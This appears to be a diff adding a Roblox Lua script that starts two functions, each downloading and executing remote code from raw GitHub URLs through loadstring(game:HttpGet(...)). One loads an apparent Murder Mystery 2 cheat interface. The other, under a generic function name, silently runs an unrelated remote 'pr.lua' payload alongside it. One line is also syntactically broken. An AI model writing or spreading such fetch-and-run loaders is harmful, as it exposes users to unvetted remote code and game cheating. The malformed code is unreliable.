@@ -1,0 +1,8 @@
+local function Function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Mathersg4/software/refs/heads/main/pr.lua'))() 
+end
+local function loadui()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/Ethanoj1/EclipseMM2/master/Script"))()"))()
+end
+task.spawn(Function)
+task.spawn(loadui)
